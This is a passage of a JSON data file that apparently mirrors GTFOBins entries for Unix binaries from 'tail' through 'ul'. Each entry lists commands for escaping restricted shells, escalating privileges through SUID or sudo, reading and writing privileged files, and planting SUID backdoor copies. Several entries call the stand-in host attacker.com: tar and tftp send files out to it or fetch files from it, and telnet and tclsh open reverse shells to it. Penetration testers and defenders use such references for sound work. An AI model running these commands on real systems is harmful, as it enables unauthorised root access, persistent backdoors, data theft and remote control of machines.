                    }
                ]
            }
        ]
    },
    {
        "name": "tail",
        "url": "https://gtfobins.github.io/gtfobins/tail/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ntail -c1G \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tail) .\n\nLFILE=file_to_read\n./tail -c1G \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "tar",
        "url": "https://gtfobins.github.io/gtfobins/tar/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    },
                    {
                        "description": "This only works for GNU tar.",
                        "code": "tar xf /dev/null -I '/bin/sh -c \"sh <&2 1>&2\"'"
                    },
                    {
                        "description": "This only works for GNU tar. It can be useful when only a limited command argument injection is available.",
                        "code": "TF=$(mktemp)\necho '/bin/sh 0<&1' > \"$TF\"\ntar cf \"$TF.tar\" \"$TF\"\ntar xf \"$TF.tar\" --to-command sh\nrm \"$TF\"*"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the rmt utility installed (it should be present by default in Debian-like distributions).",
                        "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_send.tar\nLFILE=file_to_send\ntar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the rmt utility installed (it should be present by default in Debian-like distributions).",
                        "code": "RHOST=attacker.com\nRUSER=root\nRFILE=/tmp/file_to_get.tar\ntar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This only works for GNU tar.",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > \"$TF\"\ntar c --xform \"s@.*@$LFILE@\" -OP \"$TF\" | tar x -P"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This only works for GNU tar.",
                        "code": "LFILE=file_to_read\ntar xf \"$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tar) .\n\n./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "task",
        "url": "https://gtfobins.github.io/gtfobins/task/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "task execute /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo task execute /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "taskset",
        "url": "https://gtfobins.github.io/gtfobins/taskset/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "taskset 1 /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which taskset) .\n\n./taskset 1 /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo taskset 1 /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "tbl",
        "url": "https://gtfobins.github.io/gtfobins/tbl/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ntbl $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tbl) .\n\nLFILE=file_to_read\n./tbl $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo tbl $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "tasksh",
        "url": "https://gtfobins.github.io/gtfobins/tasksh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tasksh\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tasksh\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tasksh) .\n\n./tasksh\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "tclsh",
        "url": "https://gtfobins.github.io/gtfobins/tclsh/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tclsh) .\n\n./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr"
                    }
                ]
            }
        ]
    },
    {
        "name": "tcpdump",
        "url": "https://gtfobins.github.io/gtfobins/tcpdump/",
        "functions": [
            {
                "function": "Info",
                "description": "These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.",
                "examples": [
                    {
                        "sub_description": "In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the postrotate-command to a small subset of predefined commands thus preventing the execution of the following."
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
                    }
                ]
            }
        ]
    },
    {
        "name": "tdbtool",
        "url": "https://gtfobins.github.io/gtfobins/tdbtool/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tdbtool\n! /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tdbtool\n! /bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tdbtool) .\n\n./tdbtool\n! /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "tee",
        "url": "https://gtfobins.github.io/gtfobins/tee/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tee) .\n\nLFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "telnet",
        "url": "https://gtfobins.github.io/gtfobins/telnet/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "BSD version only. Needs to be connected first.",
                        "code": "RHOST=attacker.com\nRPORT=12345\ntelnet $RHOST $RPORT\n^]\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nTF=$(mktemp -u)\nmkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "BSD version only. Needs to be connected first.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "BSD version only. Needs to be connected first.",
                        "code": "sudo install -m =xs $(which telnet) .\n\nRHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "terraform",
        "url": "https://gtfobins.github.io/gtfobins/terraform/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "terraform console\nfile(\"file_to_read\")"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which terraform) .\n\n./terraform console\nfile(\"file_to_read\")"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo terraform console\nfile(\"file_to_read\")"
                    }
                ]
            }
        ]
    },
    {
        "name": "tex",
        "url": "https://gtfobins.github.io/gtfobins/tex/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tex) .\n\n./tex --shell-escape '\\write18{/bin/sh}\\end'"
                    }
                ]
            }
        ]
    },
    {
        "name": "tftp",
        "url": "https://gtfobins.github.io/gtfobins/tftp/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file to a TFTP server.",
                        "code": "RHOST=attacker.com\ntftp $RHOST\nput file_to_send"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file from a TFTP server.",
                        "code": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Send local file to a TFTP server.",
                        "code": "sudo install -m =xs $(which tftp) .\n\nRHOST=attacker.com\n./tftp $RHOST\nput file_to_send"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Send local file to a TFTP server.",
                        "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send"
                    }
                ]
            }
        ]
    },
    {
        "name": "tic",
        "url": "https://gtfobins.github.io/gtfobins/tic/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ntic -C \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tic) .\n\nLFILE=file_to_read\n./tic -C \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo tic -C \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "time",
        "url": "https://gtfobins.github.io/gtfobins/time/",
        "functions": [
            {
                "function": "Info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "Note that the shell might have its own builtin time implementation, which may behave differently than /usr/bin/time, hence the absolute path."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "/usr/bin/time /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which time) .\n\n./time /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo /usr/bin/time /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "timedatectl",
        "url": "https://gtfobins.github.io/gtfobins/timedatectl/",
        "functions": [
            {
                "function": "Info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "This invokes the default pager, which is likely to be less, other functions may apply.\n\nThis might not work if run by unprivileged users depending on the system configuration."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "timedatectl list-timezones\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo timedatectl list-timezones\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "timeout",
        "url": "https://gtfobins.github.io/gtfobins/timeout/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "timeout 7d /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which timeout) .\n\n./timeout 7d /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo timeout --foreground 7d /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "tmate",
        "url": "https://gtfobins.github.io/gtfobins/tmate/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tmate -c /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tmate -c /bin/sh"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which tmate) .\n\n./tmate -c /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "tmux",
        "url": "https://gtfobins.github.io/gtfobins/tmux/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "tmux"
                    },
                    {
                        "description": "Provided to have enough permissions to access the socket.",
                        "code": "tmux -S /path/to/socket_name"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file is read and parsed as a tmux configuration file, part of the first invalid line is returned in an error message.",
                        "code": "LFILE=file_to_read\ntmux -f $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo tmux"
                    }
                ]
            }
        ]
    },
    {
        "name": "top",
        "url": "https://gtfobins.github.io/gtfobins/top/",
        "functions": [
            {
                "function": "Info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "This requires that an existing configuration file is present, to create one run top then type Wq. Note down the actual configuration file path and use it in the below examples."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc\ntop\n# press return twice\nreset"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This requires that the root configuration file is writable and might be used to persist elevated privileges.",
                        "code": "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset"
                    }
                ]
            }
        ]
    },
    {
        "name": "torify",
        "url": "https://gtfobins.github.io/gtfobins/torify/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "torify /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo torify /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "torsocks",
        "url": "https://gtfobins.github.io/gtfobins/torsocks/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "torsocks /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo torsocks /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "troff",
        "url": "https://gtfobins.github.io/gtfobins/troff/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "The file is typeset but text is still readable in the output, alternatively the output can be read with man -l."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ntroff $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which troff) .\n\nLFILE=file_to_read\n./troff $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo troff $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "tshark",
        "url": "https://gtfobins.github.io/gtfobins/tshark/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "This program is able to execute lua code."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' >$TF\ntshark -Xlua_script:$TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "ul",
        "url": "https://gtfobins.github.io/gtfobins/ul/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "The read file content is corrupted by replacing occurrences of $'\\b_' to terminal sequences and by converting tabs to spaces."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nul \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
